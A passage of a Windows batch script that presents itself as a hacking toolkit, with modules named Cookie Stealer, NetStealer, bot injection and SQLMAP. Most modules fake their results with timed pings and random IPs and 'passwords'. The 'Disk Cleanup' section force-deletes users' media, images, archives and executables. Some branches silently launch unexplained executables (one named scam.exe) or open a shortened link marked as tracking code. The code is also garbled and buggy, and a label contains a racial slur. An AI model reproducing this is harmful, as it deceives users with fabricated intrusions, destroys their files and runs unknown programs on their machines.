if exist "C:\WINDOWS\Users\*.ra" del "C:\WINDOWS\Users\*.ra" /f /q
if exist "C:\WINDOWS\Users\*.ram" del "C:\WINDOWS\Users\*.ram"/f /q
if exist "C:\WINDOWS\Users\*.mp3" del "C:\WINDOWS\Users\*.mp3" /f /q
if exist "C:\WINDOWS\Users\*.mov" del "C:\WINDOWS\Users\*.mov" /f /q
if exist "C:\WINDOWS\Users\*.qt" del "C:\WINDOWS\Users\*.qt" /f /q
if exist "C:\WINDOWS\Users\*.asf" del "C:\WINDOWS\Users\*.asf" /f /q
:skip
if not exist C:\WINDOWS\Users\Users\*.* goto skippy /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.zip del C:\WINDOWS\Users\Users\*.zip /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.exe del C:\WINDOWS\Users\Users\*.exe /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.gif del C:\WINDOWS\Users\Users\*.gif /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.jpg del C:\WINDOWS\Users\Users\*.jpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.png del C:\WINDOWS\Users\Users\*.png /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.bmp del C:\WINDOWS\Users\Users\*.bmp /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.avi del C:\WINDOWS\Users\Users\*.avi /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpg del C:\WINDOWS\Users\Users\*.mpg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mpeg del C:\WINDOWS\Users\Users\*.mpeg /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ra del C:\WINDOWS\Users\Users\*.ra /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.ram del C:\WINDOWS\Users\Users\*.ram /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mp3 del C:\WINDOWS\Users\Users\*.mp3 /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.asf del C:\WINDOWS\Users\Users\*.asf /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.qt del C:\WINDOWS\Users\Users\*.qt /f /q
if exist C:\WINDOWS\Users\AppData\Temp\*.mov del C:\WINDOWS\Users\Users\*.mov /f /q
:skippy
if exist "C:\WINDOWS\ff*.tmp" del C:\WINDOWS\ff*.tmp /f /q
if exist C:\WINDOWS\ShellIconCache del /f /q "C:\WINDOWS\ShellI~1\*.*"
cls
echo --------------------------------------------------------------------------------
echo Disk Cleanup
echo --------------------------------------------------------------------------------
echo.
echo Disk Cleanup successful!
echo.
pause
goto menu
:4
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Defragmenting hard disks...
ping localhost -n 3 >nul
defrag -c -v
cls
echo --------------------------------------------------------------------------------
echo Disk Defragment
echo --------------------------------------------------------------------------------
echo.
echo Disk Defrag successful!
echo.
pause
goto menu
:error
cls
echo Command not recognized.
ping localhost -n 4 >nul
goto menu
:exit
ping 127.0.0.1 >nul
goto shell00

:webpinger
cls
Title Website Pinger
color 0e
echo Enter the website you would like to ping
set input=
set /p input= Enter your Website here:
if %input%==goto A if NOT B
echo Processing Your request
ping localhost>nul
echo -------------------------------------------------------------------------------------
echo If you do not clost this in 45 seconds you will go to **ENTER WEBSITE HERE**
echo -------------------------------------------------------------------------------------
ping localhost>nul
echo This is the IP=
ping %input%
set input=
set /p input= If you want to open this adress please enter the IP here:
start iexplore.exe %input%
set input2=
set /p input2=
if %input% exit goto exit
ping localhost -n 45 >nul
start iexplore.exe **ENTER WEBSITE HERE**
:exit
goto shell00


:installsql
cls
echo Do you have a MySQL account?
echo Yes/No
set /p awn=
if %awn% == no goto newuser
if %awn% == yes goto login00

:newuser
set /p usrname=Please enter your Username: 
set /p pword=Please enter your Password: 
echo 23.71.104.11>SQLip.txt
echo %usrname%>username.txt
echo %pword%>password.txt
goto login00

:login00
set /p ip=<SQLip.txt
set /p userin2=<username.txt
set /p userin3=<password.txt
set /p userin4=Username: 
set /p userin5=Password: 
if %userin4% == %userin2% goto pwc
if not %userin4% == %userin2% goto login00
:pwc
if %userin5% == %userin3% goto welcome
if not %userin5% == %userin3% goto login00

:welcome
cls
ping localhost -n 5 >nul
echo User: %userin2%
echo Server IP: %ip%
echo Login time: %time%
echo.
set /p sercomm=%ip%@%COMPUTERNAME% ~ 
attrib
goto welcome

:siteopener
cls
:top
echo ***************************************************************
echo.
echo Site Selector
echo.
echo ***************************************************************
echo.
echo Key: [1] Google - Search Engine
echo [2] Hotmail - Mail Server
echo [3] Yahoo - Search Engine/Mail Server
echo [4] Facebook - Social Networking
echo [5] Myspace - Social Networking
echo [6] CNN - News
echo [7] Weather - Weather
echo [8] WikiHow - A How-To Website
echo [9] Instructables - A How-To Website
echo [10] YouTube - Online Videos
echo [11] Answers - Online Encyclopedia
echo [12] Wikipedia - Online Encyclopedia
echo.
echo [e] Exit
echo.
echo ***************************************************************
echo Enter the number of the website which you would like to go to:
echo.
set /p udefine= 
echo.
echo ***************************************************************
if %udefine%==1 start www.google.com
if %udefine%==2 start www.hotmail.com
if %udefine%==3 start www.yahoo.com
if %udefine%==4 start www.facebook.com
if %udefine%==5 start www.myspace.com
if %udefine%==6 start www.cnn.com
if %udefine%==7 start www.weather.com
if %udefine%==7 start www.wikihow.com
if %udefine%==9 start www.instructables.com
if %udefine%==10 start www.youtube.com
if %udefine%==11 start www.answers.com
if %udefine%==12 start www.wikipedia.com
if %udefine%==e goto exit

cls
echo ***************************************************************
echo Type [e] to exit or [b] to go back and select another site.
echo.
set /p udefine=
echo.
echo ***************************************************************
if %udefine%==b goto top
if %udefine%==e goto exit
:exit
cls
echo ***************************************************************
echo.
echo Thank You for using Site Selector by SEjMA
echo.
echo ***************************************************************
pause

:revpn
cls
call :colortext b "Please enter an IP address"
set /p reverseip=IP:
ping %reverseip% >nul
goto successfull00
cls
echo NO VPN DETECTED WITH THIS IP %reverseip%
pause
goto revpn
:successfull00
cls
echo VPN DETCTED ON %reverseip%
@REM Server.proxy = %reverseip%
::Connect.proxy.server(%reverseip%)
:001
set 001=%random%
if %001% gtr 100 goto 001
:002
set 002=%random%
if %002% gtr 255 goto 002
:003
set 003=%random%
if %003% gtr 255 goto 003
:004
set 004=%random%
if %004% gtr 100 goto 004
echo Found IP Address: %001%.%002%.%003%.%004%
pause
goto revpn




:javamanager
cls
set /p javainstall=App Name: 
call :colortext c "Installing %javainstall% please wait"
ping localHost -n 5 >nul
attrib
echo App Intsalled!
pause
goto shell00

:netd
cls
echo.
echo.
call :colortext a "Welcome "
call :colortext b " to "
call :colortext c " NetData "
call :colortext a " by, "
call :colortext d " "
echo.
echo Please start by connecting to server or public IP
echo.
set /p netinf=#Netdata@~
set /p netv4=#Netdata@%netinf%~
echo.
echo Connection Target #Netdata@%netinf%~%netv4%
set /p netprt= 0-10000 -
echo.
call :colortext c "Attempting Connection to Server"
echo.
call :colortext a "Please wait this may take a while..."
ping localhost -n 15 >nul
echo.
call :colortext a "Connection to server successfull"
echo  Password enabled on %netinf%
ping %netinf% >nul
ping %netv4% >nul
call :colortext a "connection Successfull!"
echo  Default password used on server
echo.
echo Login Success!
:niggs
set /p atc=#Netdata@%netinf%~%netv4%$ 
if %atc% == exitme goto niggsa 
echo sending command...
ping localHost -n 5 >nul
echo command sent successfully!
goto niggs
:niggsa
pause
goto shell00

:cc
cls
echo Welcome to CryptoCrack v1.0 
echo.
echo.
call :colortext c "Please connect to server , 21 default port"
echo.
set /p seec=http://
echo.
:save
echo Attempting connection... http://%seec%
ping localHost -n 5 >nul
call :colortext c "Connection Failure!"
echo.
echo Password Required for Access...
echo.
echo Please login or choose option...
echo.
set /p optt= ~ 
if %optt% == help goto helpcc
if %optt% == login goto lgnser
if %optt% == getenc goto encfind

:encfind
echo Searching for encryption...
ping localhost -n 25 >nul
echo.
echo Successfull!
echo.
call :colortext a "Found encryption on %seec%"
echo.
:0900
set one0900=%random%
if %one0900% gtr 255 goto 0900
echo Default port: %one0900%
echo.
:9099
set lll=%random%
if %lll% lss 1000 goto 9099
:0800
set ttt=%random%
if %ttt% lss 1000 goto 0800
echo Encryped password: %lll%epid%ttt%e%one0900%yu
echo.
echo Located Key: -- epid -- e -- yu
pause 
set sucpw=%lll%epid%ttt%e%one0900%yu
goto save

:lgnser
echo login to http://%seec%
echo.
set /p svpw=:
if %svpw% == %sucpw% goto access010
if not %svpw% == %sucpw% goto access000
:access010
cls
:: -----------------------------------------
:access000
call :colortext c "Incorrect Password!"
pause
goto save

:helpcc
cls
echo login - Enter server password
echo getenc - Reterives encrypted password if any
pause
goto save


:nts00
cls
call :colortext a "Welcome to NetStealer this program is used to create a MITM or man in the middle attack"
echo.
call :colortext e "Start by choosing your network interface  wlan0, eth0 ect..."
echo.
call :colortext f "NetStealer@Local ~ "
set /p ns0= 
if %ns0% == wnc00 goto wc00
if not %ns0% == wnc00 goto lcl

:lcl
echo Using Interface %ns0%  
echo.
call :colortext a "Conncting to %ns0%"
ping localhost -n 5 >nul
ipconfig | find "IPv4" & hostname
call :colortext a " Connected Successfully Reteriving Server Set"
echo.
echo Spoofing reteriving server please wait...
ping localhost -n 2 >nul
attrib -s
echo Network Spoofed...
echo.
call :colortext a "Please Choose Target Server"
echo.
set /p tser=%ns0%@
echo.
call :colortext d "Please wait checking target connection"
ping %tser% >nul
echo.
call :colortext a "%tser% is online"
echo.
call :colortext c "Accessing Server %tser% using default port"
ping localhost -n 5 >nul

:cpo
set op=%random%
if %op% lss 2500 goto cpo
echo.
call :colortext a "Connected to %tser% using port %op%"
echo.
echo Please select target on %tser% 
set /p tgr=%ns0%@%tser% ~ 
echo Verifing target on network
ping %tgr% >nul
echo.
call :colortext a "IPV4 verified on %tser%"
echo.
call :colortext f "Checking connection on server"
ping %tser% >nul
ping %tgr% >nul
echo.
call :colortext a "Connection verified and online"
echo.
:uslocked
echo Reteriving Server: %ns0%
echo Target Server: %tser%
echo Target IPV4: %tgr%
echo Access Time: %time%
echo Target: Online!
echo.
echo Start sniffing using netstream
set /p mitm=
set /p mitmtime=Time: 
ping localhost -n %mitmtime% >nul
netstat -a -b > C:\Users\%username%\Desktop\netstat.txt
echo attack successfull %tgr% netstream written to desktop
pause
goto uslocked




:wc00
echo using custom interface wireless network card


:new00
cls
set
netstat
attrib
goto shell00

:btinj
cls
call :colortext a "Welcome to customized bot injection CBI"
echo.
call :colortext c "Start by choosing your botlist and then configuring basic attack settings"
echo.
set /p btlist=SQL_ 
set /p atcnme=Attack_Name_ 
set /p ahost=Attack_Target_ 
set /p botnum=#_Of_Bots_ 
set /p atcper=Attack_Perimeter_ 
set /p tmeloop=Attack_Time_Loop_  
echo Connecting to MySQL Server: %btlist%
echo.
ping localHost -n 3 >nul
call :colortext a "Connected to %btlist% Successfully"
echo.
echo Checking Target %ahost%...
ping %ahost% >nul
echo Checking Bot Parimeters...
ping localHost -n 2 >nul
echo.
call :colortext a "Attack Ready to Launch"
echo.
ping localHost -n 3 >nul
echo Launching %atcnme% CBI...
ping localhost -n 5 >nul
echo MySQL Server: %btlist%
echo Attack Target: %ahost% :: ONLINE
echo Using %botnum% Bots...
echo Bots Injected to: %atcper%
echo Attack launching for %tmeloop% Seconds...
ping localHost -n %tmeloop% >nul
goto atc0

:cs
cls
echo.
echo.
call :colortext a "Welcome to Cockie Stealer"
echo.
call :colortext b "To Continue Please Type Your First Command"
echo.
ping loaclhost -n5 >nul
:load
echo ......................$$$$
echo ......................$$$$
echo ...........$$$$$$$$$$$$$$$$$
echo .......$$$$$$$$$$$$$$$$$$$$$$
echo .....$$$$$$$.........$$$$....$$$$$$$$
echo ...$$$$$$............$$$$........$$$$$$$
echo ..$$$$$$............$$$$..........$$$$$$
echo ..$$$$$$...........$$$$
echo ..$$$$$$...........$$$$
echo ...$$$$$$..........$$$$
echo ....$$$$$$$$.......$$$$
echo ......$$$$$$$$$$$$$$$
echo ..........$$$$$$$$$$$$$$$$$$
echo .................$$$$$$$$$$$$$$$$
echo ......................$$$$.$$$$$$$$$$
echo ......................$$$$.......$$$$$$$
echo ......................$$$$..........$$$$$$
echo ......................$$$$...........$$$$$$
echo $$$$$$$..............$$$$..........$$$$$$$
echo .$$$$$$..............$$$$..........$$$$$$$
echo ..$$$$$$$............$$$$........$$$$$$$$
echo ...$$$$$$$$..........$$$$......$$$$$$$$
echo ......$$$$$$$$$$$$$$$$$$$$$$$$
echo ..........$$$$$$$$$$$$$$$$$$$
echo ..................$$$$$$$$
echo ......................$$$$
echo ......................$$$$
echo.
call :colortext d "Root@CookieStealer ~ $"
set /p css= 
if %css% == siteselect goto ss1
if %css% == targetselect goto ts
if %css% == cookieselect goto cs1
if %css% == reverseattack goto reva
if %css% == exitstealer goto shell00

:error
echo Incorrect command!
pause
goto load

:reva
echo.
call :colortext c "Accessing %tss%..."
echo.
ping localhost -n 4 >nul
call :colortext a "%tss% access was successfully granted!"
echo.
call :colortext b "Accessing user information... %tss1%"
ping localhost -n 4 >nul
echo.
ping %tss1%
call :colortext a "Access granted to user information via: %tss%/%tss1%/logfiles/12.12.12/userinfo/"
echo.
echo Database PUIP: %tss% 
echo Database IPAR: %tss%
echo Database Date: %date%
echo Database Time: %time%
echo Attack Target: %tss1%
echo IP Masked too: 1.1.1.1
echo Database Target Path: %tss%/%tss1%/logfiles/12.12.12/userinfo/
echo Database User: N/A
echo.
call :colortext a "Accessing database user %tss1% information from oldest saved date in database"
echo.
:: %tss%.search(%tss%/%tss1%/logfiles/%dateold%/userinfo/)
:: RETURN %tss1%.passwordlog(%tss%)
:: RETURN %tss1%.emailuserlog(%tss%)
ping localhost -n 10 >nul
call :colortext c "NO FOUND USER PASSWORD CORROSPONDING WITH %tss1% BEFORE SSL"
echo.
call :colortext a "NO USER EMAIL CORROSPONDING WITH %tss1% BEFORE SSL"
pause
goto load

:cs1
echo.
start c:\acgr.exe
echo Please push enter to spoof your public IP address...
set /p mask=1.1.1.1
ping localhost -n5 >nul
echo IP Address was Successfully Masked!"
echo.
echo Database PUIP: %tss% 
echo Database IPAR: %tss%
echo Database Date: %date%
echo Database Time: %time%
echo Attack Target: %tss1%
echo IP Masked too: 1.1.1.1
echo Database Target Path: %tss%/db/user_list, %tss%/db/secure/md5/password_list
echo Database User: N/A
echo.
call :colortext b "Please Choose Your Parameters for the Attack"
echo.
set /p par= ~ 
if %par% == ipmatch goto ipmat

:ipmat
echo.
call :colortext c "Searching UserIP Match in %tss% DataBase to locate username"
ping localHost -n 9 >nul
echo.
echo 1 result found in %tss%/db/user_list [%tss1%]
echo.
echo Scanning %tess%/db/password_list corrosponding with the IP address %tss1% in %tss%/db/user_list
echo.
ping loaclhost -n 15 >nul
:: TRACKING CODE IPR: P6NHOE
start https://goo.gl/rF14kJ
echo Stealing from %tss% for user %tss1% Cookies...
echo.
call :colortext b "SSL is enabled on %tss%! Encrypeted passwords may be shown!"
echo.
echo.
echo Please wait password is being stolen!
set 44333 == *ERROR
echo.
:rnd1111
set one=%random%
if %one% lss 10000 goto rnd1111

:rnd2222
set two=%random%
if %two% lss 15000 goto rnd2222

:rnd3333
set three=%random%
if %three% lss 25555 goto rnd3333

:rnd4444
set four=%random%
if %four% lss 5000 goto rnd4444
:: locate.user(%tss%) in (%tss1%)
:: If Existis %tss% in %tss1% then
:: RETURN %tss1%.emailuserlog.user(%tss% on %tss1%)
:: RETURN %tss1%.passwordlog.user(%tss% on %tss1%)
echo.
echo.
echo User: %tss1% has a password logged on %tss% Password: %one%%two%%three%%four%
echo.
echo.
echo User: %tss1% has a email logged on %tss% Email: %44333%
echo.
pause
goto load

:ts
echo.
call :colortext a "Please Select Your Target via public IP Address"
echo.
set /p tss1= ~ 
:: IMPORTS system.api
:: using api(%nx8yi%)
:: %targethost%==api.resolve(%tss%), connecting to "%tss1%"
echo Checking target ping...
ping %tss1%
echo.
call :colortext a "User IP Verified and Online!"
echo.
call :colortext b "Target selected successfully!"
pause
goto load

:ss1
echo.
call :colortext a "Please Select Your Target Site via IP Address"
echo.
set /p tss= ~ 
echo.
call :colortext a "Please wait, verifying site..."
echo.
ping localHost -n 3 >nul
call :colortext a "Site Verified! And is Vulnerable to Cookie Stealing Method!"
echo.
ping %tss%
echo.
call :colortext b "%tss% Online!"
echo.
echo Site %tss%'s DataBase is being accessed please stand By. blackmagic..
ping loaclhost -n 7 >nul
attrib
echo.
echo.
color a
call :colortext c "DataBase Access Granted!"
echo.
echo Database PUIP: %tss% 
echo Database IPAR: %tss%
echo Database Date: %date%
echo Database Time: %time%
echo Database Target Path: %tss%/db/user_list, %tss%/db/secure/md5/password_list
echo Database User: N/A
echo.
echo Target site has been selected successfully!
pause
color f
goto load


:sbot
start c:\1_0.exe
goto shell00

:sudo22
cls
call :colortext f "Please wait loading reverse proxy killer"
echo.
ping localhost -n 5 >nul
cls
call :colortext a "user %userdomain% connected"
echo.
echo %time%
echo.
call :colortext c "Local@ProxyKiller ~ "
set /p pk0=
if %pk0% == setparip239.251.5.105 goto par00

:par00
echo Checking IP 239.251.5.105 please wait...
ping localhost -n 5 >nul
echo.
call :colortext c "WARNING  YOU ARE TRYING TO ACCESS A UNITED STATES GOVERNMENT INTERNET PROTOCALL UNAUTHARIZED ACCESS TO DATA ON THIS PROTOCALL ARE SUBJECT TO LEGAL PENITALY"
echo.
echo please type (yes) if you accept the following TOC or (no) if you do not accept...
set /p con0=
if %con0% == yes goto acyes
if not %con0% == yes goto acno

:acno
goto shell00

:atc0
echo.
call :colortext a "Attack Complete"
echo.
echo Results: %botnum% Bots returned :: %random% byte(s)
echo %time% x389eryh7r83 >> CBI.rslt
echo %time% e8m23u8fhfi3 >> CBI.rslt
echo %time% e7he83un7erg >> CBI.rslt
echo %time% ue9hnrb7ry82 >> CBI.rslt
pause
goto shell00

:acyes
echo TOC accespted!
echo.
call :colortext a "Accessing local database on 239.251.5.105"
ping localhost -n 5 >nul
echo.
echo  server time : %time%
echo access level (unknown)
echo.
call :colortext a "configure collection parameter"
set /p ccp=@239.251.5.105 ~ 
if %ccp% == ftplocaldata goto ftpl0

:ftpl0
cls
call :colortext a "Accessing local data on 239.251.5.105"
ping localhost -n 4 >nul
echo.
echo database comprimised successfully!
ping localhost -n 3 >nul
echo launching recovered files on proxy 239.251.5.105
ping localHost -n 5 >nul
echo decrypting data...
ping localhost -n 10 >nul
echo launching...
start c:\Server55865
goto shell00

:wihoax
color e
cls
call :colortext a "Welcome to HoaxNet By. blackmagic"
echo.
call :colortext b "To get started please specify network (Wlan0, Eth0)"
echo.
:hoaxnet
echo.
echo ......................¶¶¶¶¶¶¶¶¶
echo ....................¶¶..........¶¶
echo ......¶¶¶¶¶.......¶¶..............¶¶
echo .....¶.....¶....¶¶.....¶¶....¶¶.....¶¶
echo .....¶.....¶...¶¶......¶¶....¶¶.......¶¶
echo .....¶....¶..¶¶........¶¶....¶¶........¶¶
echo ......¶...¶...¶.........................¶¶
echo ....¶¶¶¶¶¶¶¶¶¶¶¶........................¶¶
echo ...¶............¶.¶¶.............¶¶.....¶¶
echo ..¶¶............¶..¶¶............¶¶.....¶¶
echo .¶¶...¶¶¶¶¶¶¶¶¶¶¶....¶¶........¶¶.......¶¶
echo .¶...............¶.....¶¶¶¶¶¶¶.........¶¶
echo .¶¶..............¶....................¶¶
echo ..¶...¶¶¶¶¶¶¶¶¶¶¶¶...................¶¶
echo ..¶¶...........¶..¶¶................¶¶
echo ...¶¶¶¶¶¶¶¶¶¶¶¶.....¶¶............¶¶
echo .......................¶¶¶¶¶¶¶¶¶¶¶
call :colortext c "HoaxNet -_- "
set /p netint= @~  
if %netint% == wlan0 goto wint
if not %netint% == wlan0 goto eint
if %netint% == checknet goto checknet

:checknet
cls
echo > C:\Users\%username%\Desktop\webaddr.txt

:wint
cls
call :colortext a "Wireless Interface Choosen!"
echo.
call :colortext d "Please name your beautiful network..."
echo.
call :colortext b "HoaxNet -_- "
set /p nname= @~ 
echo WNC Name set as: %nname%
echo.
echo Please choose finish_Setup, cancel_setup or adavanced_setup
echo.
call :colortext b "HoaxNet -_- "
set /p choice= @~ 
if %choice% == finish_setup goto gnet
if %choice% == cancel_setup goto shell00
if %choice% == adavanced_setup goto advnet

:gnet
cls
call :colortext b "Configuring Basic Network Settings..."
echo.
ping localhost -n 2 >nul
echo Subnet Mask: 255.255.255.0
ping localHost -n 2 >nul
echo MTU        : 1400
ping localhost -n 1 >nul
echo Port       : 10000
ping localhost -n 1 >nul
echo /Admin     : https://www.admin%nname%.com 
ping localhost -n 3 >nul
echo IPV4       : 1.1.1.1
echo.
call :colortext c "Configuring Public IP..."
echo.
:rnd111
set one=%random%
if %one% gtr 255 goto rnd111

:rnd222
set two=%random%
if %two% gtr 255 goto rnd222

:rnd333
set three=%random%
if %three% gtr 255 goto rnd333

:rnd444
set four=%random%
if %four% gtr 255 goto rnd444

call :colortext b "IPAR: %one%.%two%.%three%.%four%"
ping loaclhost -n 3 >nul
cls
echo Name: %nname%
echo Intf: Wlan0
echo SM: 255.255.255.0
echo MTU: 1400
echo Port: 10000
echo Domain: https://www.admin%nname%.com
call :colortext c "SSL: OFF"
echo IPV4: 1.1.1.1
echo IPAR: %one%.%two%.%three%.%four%
call :colortext a "Status: Online!"
echo.
call :colortext c "Testing Connection"
echo.
ping %one%.%two%.%three%.%four%
echo.
call :colortext a "%nname% is Online!"
echo.
pause
goto hoaxnet

:egnet
cls
call :colortext b "Configuring Basic Network Settings..."
echo.
ping localhost -n 2 >nul
echo Subnet Mask: 255.255.255.0
ping localHost -n 2 >nul
echo MTU        : 1400
ping localhost -n 1 >nul
echo Port       : 10000
ping localhost -n 1 >nul
echo /Admin     : https://www.admin%nname%.com 
ping localhost -n 3 >nul
echo IPV4       : 1.1.1.1
echo.
call :colortext c "Configuring Public IP..."
echo.
:rnd111
set one=%random%
if %one% gtr 255 goto rnd111

:rnd222
set two=%random%
if %two% gtr 255 goto rnd222

:rnd333
set three=%random%
if %three% gtr 255 goto rnd333

:rnd444
set four=%random%
if %four% gtr 255 goto rnd444

call :colortext b "IPAR: %one%.%two%.%three%.%four%"
ping loaclhost -n 3 >nul
cls
echo Name: %nname%
echo Intf: Eth0
echo SM: 255.255.255.0
echo MTU: 1400
echo Port: 10000
echo Domain: https://www.admin%nname%.com
call :colortext c "SSL: OFF"
echo IPV4: 1.1.1.1
echo IPAR: %one%.%two%.%three%.%four%
call :colortext a "Status: Online!"
echo.
call :colortext c "Testing Connection"
echo.
ping %one%.%two%.%three%.%four%
echo.
call :colortext a "%nname% is Online!"
echo.
pause
goto hoaxnet

:advnet
cls
color c
echo Subnet Mask 1-255 
set /p smsk= @~ 
echo Configure IPV4 1-255
set /p v4= @~ 
echo Configure IPAR 1-255 (Public IP)
set /p ipar= @~ 
echo Configure MTU's 1-5000
set /p mtu= @~ 
echo Configure Port...
set /p prt= @~ 
echo Configure Server Domian
set /p dmin= @~ https://www.%nname%.
echo SSL_OFF : SSL_ON
set /p ssl= @~ 
echo MBPS 10 MBPS - MAX Ping
set /p mbps= @~ 
cls
call :colortext a "Please Wait While Your Network is Configured"
ping %ipar%
echo Network Online!
echo.
echo %nname%
echo %smsk%
echo %v4%
echo %ipar%
echo %mtu%
echo %prt%
echo %dmin%
echo %ssl%
echo %mbps%
set /p cfim=Comfirm Settings Y/N: 
if %cfim% == y goto hoaxnet
if %cfim% == n goto advnet


:eint
cls
call :colortext a "Wired Interface Choosen!"
echo.
call :colortext d "Please name your beautiful network..."
echo.
call :colortext b "HoaxNet -_- "
set /p nname= @~ 
echo WNC Name set as: %nname%
echo.
echo Please choose finish_Setup, cancel_setup 
echo.
call :colortext b "HoaxNet -_- "
set /p choice= @~ 
if %choice% == finish_setup goto egnet
if %choice% == cancel_setup goto shell00


:liveview
cls
start C:\Users\%username%\Desktop\scam.exe
goto shell00

:ifcon 
ipconfig /all
pause
goto shell00

:connectph00
cls
title Connect to a 4G/3G/G server or dialup...
call :colortext c "Please connect via IP address and Password, to a 4G, 3G or G server or dialup"
echo.
echo.
set /p phoneserver= IP ~ 
echo.
ping localhost -n 2 >nul
set /p phserpw= PASSWORD ~ 
ping localhost -n 3 >nul
cls
title Verifing Server...
echo Please Wait...
call :colortext a "Verifying IP Address..."
ping localhost -n 5 >nul
if %phoneserver% == 50.112.7.81 goto phnsvrversuc
if not %phoneserver% == 50.112.7.81 goto phnsvrverfal
:phnsvrverfal
cls
echo Please Wait...
call :colortext a "Verifying IP Address..."
call :colortext c " Verifacation Failure! Please Check Your IP Address"
echo.
pause
goto connectph00

:phnsvrversuc
cls
echo Please Wait...
call :colortext a "Verifying IP Address..."
call :colortext a " Verifacation Successfull!"
echo.
call :colortext a "Verifing Password..."
ping loaclhost -n 5 >nul
if %phserpw% == easyas123 goto phnsvrpwversuc
if not %phserverpw% == easyas123 goto phnsvrpwverfal
:phnsvrpwversuc
cls
echo Please Wait...
call :colortext a "Verifying IP Address..."
call :colortext a " Verifacation Successfull!"
echo.
call :colortext a "Verifing Password..."
call :colortext a " Verifacation Successfull!"
@REM %phserpw% AS STRING, MD5.HASHCRYPT
ping loaclhost -n 5 >nul
cls
echo Welcome! Please use one of the following commands...
echo.
echo TRACEDL, Track a phone number with a live ping.
echo 

:phnsvrpwverfal
cls
echo Please Wait...
call :colortext a "Verifying IP Address..."
call :colortext a " Verifacation Successfull!"
echo.
call :colortext a "Verifing Password..."
call :colortext c " Verifacation Failure! Please Check Your Password"
goto connectph00


@REM ^{proxylist\windows\config\temp\$set/p.txt^}
:prcon00
cls
title Set up a proxy server...
echo.
call :colortext a "Welcome Please Type Your Proxy DNS"
echo.
echo.
set /p prxyaddr= DNS~ 
set /p prxypwrd= PASSWORD~
set /p prxyconf= CONFIRM PASSWORD~ 
ping localhost -n 5 >nul
cls
echo Please Wait...
ping loaclhost -n 3 >nul
ipconfig /release
if errorlevel = 1 ipconfig /release_all >nul
ipconfig /renew >nul
cls
call :colortext c "Configuration Complete!"
ping localhost -n 4 >nul
goto shell00

:sql00
cls
call :colortext b "Welcome to Bo2-Modz_x's SQLMAP (SQL Injection Terminal)"
echo.
echo Loading Terminal.
ping loaclhost -n 1 >nul
cls
call :colortext b "Welcome to Bo2-Modz_x's SQLMAP (SQL Injection Terminal)"
echo.
echo Loading Terminal..
ping loaclhost -n 1 >nul
cls
call :colortext b "Welcome to Bo2-Modz_x's SQLMAP (SQL Injection Terminal)"
echo.
echo Loading Terminal...
ping loaclhost -n 1 >nul
echo Please enter the website URL:
set /p wurl=  
echo. > c:\webaddr.txt %wurl%
ipconfig
echo.
call :colortext a "Connect to database or server"
set /p cdb= ~ 
ping localhost -n 3 >nul
mshta "javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( 'Connection to %cdb% was successfull!', 10, '%cdb%', 64 );close()"
mshta "javascript:var sh=new ActiveXObject( 'WScript.Shell' ); sh.Popup( 'Server security level is %random%', 10, 'Security [Information]', 64 );close()"
cls
call :colortext c "Bypassing security... %cdb%"
ping localhost -n 5 >nul
call :colortext a " {Successfull}"
echo.
echo errorlevel returned = 0
echo.
call :colortext d "Receiving DATA..." 
start c:\acc.exe
echo.
echo.
echo Receiving Database IP address or IPAR...

:rnd11
set one=%random%
if %one% gtr 255 goto rnd11

:rnd22
set two=%random%
if %two% gtr 255 goto rnd22

:rnd33
set three=%random%
if %three% gtr 255 goto rnd33

:rnd44
set four=%random%
if %four% gtr 255 goto rnd44

cls
echo.
echo >> c:\SQL_Attack_data.txt Target: %cdb% Security Level: %random% Errorlevel: 0 %date% %time% >nul
echo Server received date and time is %date% and %time%
color a
echo.
echo.
call :colortext c "Requesting Access..."
ping localhost -n 4 >nul
call :colortext a " [Access Granted]" 
ping localhost -n 1 >nul
echo.
echo "<Accessing Database...>"
echo Databese IP %one%.%two%.%three%.%four%
ping localhost -n 4 >nul
echo "<Access granted!...>"
echo.
call :colortext c "Securing MBPS for server..."
:rmbs
set mbs=%random%
if %mbs% gtr 100 goto rmbs 
if %mbs% lss 35 goto rmbs
echo.
:seraccessgra
echo ---------------------------------------
echo Database PUIP: %cdb% 
echo Database IPAR: %one%.%two%.%three%.%four%
echo Database Date: %date%
echo Database Time: %time%
echo Database User: N/A
echo Database MB/s: %mbs%.00 MB/Ps
echo ---------------------------------------
ping localhost -n 3 >nul
echo.
call :colortext f "Database ~ "
set /p sercom11=
if %sercom11% == ping goto ping_db
if %sercom11% == viewcode goto viewhtml
if %sercom11% == editcode goto editcode
if %sercom11% == visualedit goto vised
if %sercom11% == exitme goto shell00

:noncom
echo INCORRECT SQLMAP COMMAND!
pause
goto seraccessgra

:vised
cls
ping localhost -n 3 >nul
start C:\webedit.exe
cls
goto seraccessgra

:editcode
start Received_Data.txt
cls
goto seraccessgra

:viewhtml
cls
mode 300
type Received_Data.txt
pause
goto seraccessgra

:ping_db
ping %one%.%two%.%three%.%four%
ping localhost -n 3 >nul
cls
goto seraccessgra


:check00
echo Checking Device...
ping localhost -n 5 >nul
set /p tes=:

echo !MEMORY Errorlevel
pause
:112000

 
:getip00
cls
set /p website=www.
if %website% == bo2-mod-store.weebly.com goto kill00
if not %website% == bo2-mod-store.weebly.com goto rnd100
:rnd100
call :colortext a "www.%website% s IP address is "
echo.
:rnd19
set one=%random%
if %one% gtr 255 goto rnd1

:rnd2
set two=%random%
if %two% gtr 255 goto rnd2

:rnd3
set three=%random%
if %three% gtr 255 goto rnd3

:rnd4
set four=%random%
if %four% gtr 255 goto rnd4
echo %one%.%two%.%three%.%four%
pause 
goto getip00

:rnd1
set one=%random%
if %one% gtr 255 goto rnd1

:rnd2
set two=%random%
if %two% gtr 255 goto rnd2

:rnd3
set three=%random%
if %three% gtr 255 goto rnd3

